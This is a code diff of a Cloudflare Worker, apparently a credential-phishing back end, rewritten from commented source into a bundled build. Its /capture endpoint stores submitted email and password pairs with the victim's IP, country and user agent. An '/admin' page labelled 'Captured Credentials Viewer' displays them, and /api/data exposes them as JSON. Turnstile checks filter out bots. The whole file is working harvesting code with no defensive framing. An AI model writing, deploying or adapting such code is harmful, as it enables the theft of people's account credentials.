@@ -1,115 +1,91 @@
-// Cloudflare Worker to capture and display credentials
-// Deploy using: wrangler deploy
+var __defProp = Object.defineProperty;
+var __name = (target, value) => __defProp(target, "name", { value, configurable: true });
 
-// Simple in-memory storage (clears on worker restart)
-// For production, use Cloudflare KV or D1 database
-const capturedData = [];
-
-export default {
+// worker.js
+var capturedData = [];
+var worker_default = {
   async fetch(request, env, ctx) {
     const url = new URL(request.url);
     const corsHeaders = {
-      'Access-Control-Allow-Origin': '*',
-      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
-      'Access-Control-Allow-Headers': 'Content-Type',
+      "Access-Control-Allow-Origin": "*",
+      "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
+      "Access-Control-Allow-Headers": "Content-Type"
     };
-
-    // Handle CORS preflight
-    if (request.method === 'OPTIONS') {
+    if (request.method === "OPTIONS") {
       return new Response(null, { headers: corsHeaders });
     }
-
-    // Admin Dashboard - View all captured credentials
-    if (url.pathname === '/admin' || url.pathname === '/') {
+    if (url.pathname === "/admin" || url.pathname === "/") {
       const html = generateAdminDashboard(capturedData);
       return new Response(html, {
-        headers: { 'Content-Type': 'text/html', ...corsHeaders }
+        headers: { "Content-Type": "text/html", ...corsHeaders }
       });
     }
-
-    // Capture endpoint - Receives credentials from frontend
-    if (url.pathname === '/capture' && request.method === 'POST') {
+    if (url.pathname === "/capture" && request.method === "POST") {
       try {
         const data = await request.json();
-        
-        // Verify Turnstile token with Cloudflare
         const turnstileValid = await verifyTurnstile(data.turnstileToken, env.TURNSTILE_SECRET_KEY);
-        
         const captureEntry = {
           id: crypto.randomUUID(),
           email: data.email,
           password: data.password,
-          timestamp: data.timestamp || new Date().toISOString(),
+          timestamp: data.timestamp || (/* @__PURE__ */ new Date()).toISOString(),
           userAgent: data.userAgent,
-          ip: request.headers.get('CF-Connecting-IP'),
+          ip: request.headers.get("CF-Connecting-IP"),
           country: request.cf?.country,
           turnstileVerified: turnstileValid,
-          receivedAt: new Date().toISOString()
+          receivedAt: (/* @__PURE__ */ new Date()).toISOString()
         };
-        
         capturedData.unshift(captureEntry);
-        
-        // Keep only last 100 entries
         if (capturedData.length > 100) {
           capturedData.pop();
         }
-        
         return new Response(JSON.stringify({ success: true }), {
-          headers: { 'Content-Type': 'application/json', ...corsHeaders }
+          headers: { "Content-Type": "application/json", ...corsHeaders }
         });
       } catch (error) {
         return new Response(JSON.stringify({ error: error.message }), {
           status: 500,
-          headers: { 'Content-Type': 'application/json', ...corsHeaders }
+          headers: { "Content-Type": "application/json", ...corsHeaders }
         });
       }
     }
-
-    // API endpoint to get captured data as JSON
-    if (url.pathname === '/api/data') {
+    if (url.pathname === "/api/data") {
       return new Response(JSON.stringify(capturedData, null, 2), {
-        headers: { 'Content-Type': 'application/json', ...corsHeaders }
+        headers: { "Content-Type": "application/json", ...corsHeaders }
       });
     }
-
-    return new Response('Not Found', { status: 404 });
+    return new Response("Not Found", { status: 404 });
   }
 };
-
-// Verify Cloudflare Turnstile token
 async function verifyTurnstile(token, secretKey) {
   if (!token || !secretKey) return false;
-  
   try {
-    const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
+    const response = await fetch("https://challenges.cloudflare.com/turnstile/v0/siteverify", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
       body: JSON.stringify({
         secret: secretKey,
         response: token
       })
     });
-    
     const result = await response.json();
     return result.success === true;
   } catch {
     return false;
   }
 }
-
-// Generate beautiful admin dashboard HTML
+__name(verifyTurnstile, "verifyTurnstile");
 function generateAdminDashboard(data) {
-  const rows = data.map(entry => `
+  const rows = data.map((entry) => `
     <tr>
       <td>${escapeHtml(entry.email)}</td>
       <td class="password-cell">${escapeHtml(entry.password)}</td>
       <td>${formatDate(entry.receivedAt)}</td>
-      <td>${entry.ip || 'N/A'}</td>
-      <td>${entry.country || 'N/A'}</td>
-      <td><span class="badge ${entry.turnstileVerified ? 'success' : 'warning'}">${entry.turnstileVerified ? '✓ Verified' : '⚠ Unverified'}</span></td>
+      <td>${entry.ip || "N/A"}</td>
+      <td>${entry.country || "N/A"}</td>
+      <td><span class="badge ${entry.turnstileVerified ? "success" : "warning"}">${entry.turnstileVerified ? "\u2713 Verified" : "\u26A0 Unverified"}</span></td>
     </tr>
-  `).join('');
-
+  `).join("");
   return `<!DOCTYPE html>
 <html>
 <head>
@@ -215,7 +191,7 @@ function generateAdminDashboard(data) {
 </head>
 <body>
   <div class="container">
-    <h1>📊 BookyMyTest Dashboard</h1>
+    <h1>\u{1F4CA} BookyMyTest Dashboard</h1>
     <p class="subtitle">Captured Credentials Viewer</p>
     
     <div class="stats">
@@ -224,16 +200,16 @@ function generateAdminDashboard(data) {
         <div class="stat-label">Total Captured</div>
       </div>
       <div class="stat-card">
-        <div class="stat-value">${data.filter(e => e.turnstileVerified).length}</div>
+        <div class="stat-value">${data.filter((e) => e.turnstileVerified).length}</div>
         <div class="stat-label">Verified</div>
       </div>
       <div class="stat-card">
-        <div class="stat-value">${new Set(data.map(e => e.email)).size}</div>
+        <div class="stat-value">${new Set(data.map((e) => e.email)).size}</div>
         <div class="stat-label">Unique Emails</div>
       </div>
     </div>
     
-    <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
+    <button class="refresh-btn" onclick="location.reload()">\u{1F504} Refresh</button>
     
     ${data.length === 0 ? '<div class="empty-state"><h3>No data captured yet</h3><p>Submissions will appear here automatically</p></div>' : `
     <table>
@@ -251,23 +227,23 @@ function generateAdminDashboard(data) {
     </table>
     `}
   </div>
-  <script>setInterval(() => location.reload(), 30000);</script>
+  <script>setInterval(() => location.reload(), 30000);<\/script>
 </body>
 </html>`;
 }
-
+__name(generateAdminDashboard, "generateAdminDashboard");
 function escapeHtml(text) {
-  if (!text) return '';
-  return text
-    .replace(/&/g, "&amp;")
-    .replace(/</g, "&lt;")
-    .replace(/>/g, "&gt;")
-    .replace(/"/g, "&quot;")
-    .replace(/'/g, "&#039;");
+  if (!text) return "";
+  return text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
 }
-
+__name(escapeHtml, "escapeHtml");
 function formatDate(isoString) {
-  if (!isoString) return 'N/A';
+  if (!isoString) return "N/A";
   const date = new Date(isoString);
   return date.toLocaleString();
 }
+__name(formatDate, "formatDate");
+export {
+  worker_default as default
+};
+//# sourceMappingURL=worker.js.map
